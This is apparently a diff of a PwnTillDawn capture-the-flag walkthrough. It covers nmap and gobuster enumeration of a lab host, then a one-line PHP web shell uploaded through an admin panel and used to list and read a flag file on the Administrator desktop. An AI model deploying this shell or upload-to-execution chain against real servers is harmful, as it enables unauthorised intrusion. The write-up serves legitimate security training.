@@ -1,62 +1,69 @@
 Walkthrough (PwnTillDawn – Flag 1)
 
-Step 1: Network Scanning
+Step 1: Connect to VPN
 
-Since PwnTillDawn already gave the network range:
+Before starting, I connected to the PwnTillDawn network using OpenVPN:
+sudo openvpn PwnTillDawn.ovpn
+
+Step 2: Network Scanning
+
+The given network range:
 10.150.150.10 - 10.150.150.254
 
-I scanned for live hosts:
+Scan for active hosts:
 nmap -sn 10.150.150.10-254
 
-Found active target:
+Found:
 10.150.150.11
 
-Step 2: Service & Port Scanning
+Step 3: Service & Port Scanning
 
-Then I scanned the target in detail:
 nmap -sC -sV -Pn 10.150.150.11
 
-Step 3: Directory Enumeration
+Identified:
+Open ports (e.g., 80)
+Web server running
+Target OS (Windows)
 
-Used gobuster to find hidden directories:
+Step 4: Directory Enumeration
+
 gobuster dir -u http://10.150.150.11/ -w /usr/share/wordlists/dirb/common.txt
 
-Found important paths:
+Found:
 /admin
 /upload
 
-Step 4: Access Admin Panel
+Step 5: Access Admin Panel
 
-Opened in browser:
+Open in browser:
 http://10.150.150.11/admin
 
-I found file upload functionality
+Located file upload feature
 
-Step 5: Exploitation (Upload Web Shell)
+Step 6: Exploitation (Web Shell)
 
-Created a web shell:
+Create payload:
 `echo '<?php system($_GET["cmd"]); ?>' > cmd.php`
 
-Uploaded cmd.php via the admin panel.
+Upload cmd.php via admin panel.
 
-Step 6: Gain Remote Access
+Step 7: Remote Command Execution
 
-Accessed the web shell in browser:
+Access web shell:
 http://10.150.150.11/upload/2/cmd.php?cmd=whoami
 
-Confirmed access (command executed successfully)
+Verified command execution
 
-Step 7: Enumeration (Find the Flag)
+Step 8: Locate the Flag
 
-Navigated directories:
+Navigate to Desktop:
 ?cmd=dir C:\Users\Administrator\Desktop
 
 Found:
 FLAG1.txt
 
-Step 8: Retrieve the Flag
+Step 9: Retrieve the Flag
 
-Used:
 ?cmd=type C:\Users\Administrator\Desktop\FLAG1.txt
 
-Successfully retrieved the flag
+Flag successfully retrieved
